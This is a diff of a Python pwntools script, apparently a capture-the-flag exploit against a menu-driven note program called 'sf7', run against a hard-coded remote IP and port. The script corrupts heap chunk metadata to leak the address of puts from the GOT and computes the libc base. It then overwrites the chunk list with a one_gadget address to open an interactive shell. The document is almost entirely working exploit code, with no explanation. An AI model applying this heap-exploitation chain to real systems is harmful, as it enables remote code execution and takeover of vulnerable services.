@@ -1,36 +1,71 @@
-from pwn import*
-p = process('./sf7')
-# gadget
+from pwn import *
+#p = process('./sf7')
+p = remote('35.194.245.237',8087)
+t = 0.05
 
-# def
-def menu(sel):
-	p.sendlineafter('> ',str(sel))
+### Gadget
+puts_got = 0x602028
+pop_rdi = 0x4010d3
 
-def create(size,memo):
-	menu(1)
-	p.sendlineafter('note size : ',str(size))
-	p.sendlineafter('memo : ',memo)
+### Definition
+def choice(idx):
+	p.sendlineafter("> ", str(idx))
 
-def modify(memo,new_memo):
-	menu(3)
-	p.sendlineafter('memo : ',memo)
-	p.sendafter('new memo : ',new_memo)
+def create_data(size, memo):
+	choice(1)
+	p.sendlineafter('size : ', str(size))
+	p.sendafter('memo : ', memo)
 
-def delete(memo):
-	menu(4)
-	p.sendlineafter('memo : ',memo)
+def modify_data(memo, new_memo):
+	choice(3)
+	p.sendafter('memo : ', memo)
+	sleep(t)
+	p.sendafter('memo : ', new_memo)
 
-def author(name):
-	p.sendliteafter('new author : ',name)
+def delete_data(memo):
+	choice(4)
+	p.sendafter('memo : ', memo)
 
-# exploit
-p.sendline('X'*8)
-create(0x10,'a'*8)
-create(0x10,'b'*8)
-create(0x10,'c'*8)
-create(0x10,'d'*8)
+def change_author(name):
+	choice(5)
+	p.sendafter(" : ", str(name))
 
-modify('a'*8,p64(0)*9+p16(0xa1))
-#modify('c'*8,p64(0)*4+p64(0xa0))
-#delete('b'*8)
+def show():
+	choice(2)
+
+
+### Exploit
+p.sendafter('name : ', p64(0xDEADBEEF))
+
+# leak
+create_data(0x10, 'a'*8)
+create_data(0x10, 'b'*8)
+create_data(0x10, 'c'*8)
+
+pay = ''
+pay += 'b'*0x8 + p64(0)
+pay += p64(0) + p64(0x31)
+pay += p64(0) + p64(puts_got)
+pay += p64(puts_got)
+modify_data('bbbbbbbb\x00', pay)
+
+show()
+p.recvuntil("[5]\n")
+libc_puts = u64(p.recv(6).ljust(8,'\x00'))
+libc_base = libc_puts - 456352
+#one_list = [0x45226, 0x4527a, 0xf0364, 0xf1207]
+one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget = libc_base + one_list[3]
+
+
+log.info("libc_puts  : {}".format(hex(libc_puts)))
+log.info("libc_base  : {}".format(hex(libc_base)))
+log.info("one_gadget : {}".format(hex(one_gadget)))
+
+change_author(p64(libc_puts))
+# *** change chunk list head -> p64(libc_puts) ***
+
+pay = ''
+pay += p64(one_gadget)
+modify_data(p64(libc_puts), pay)
 p.interactive()
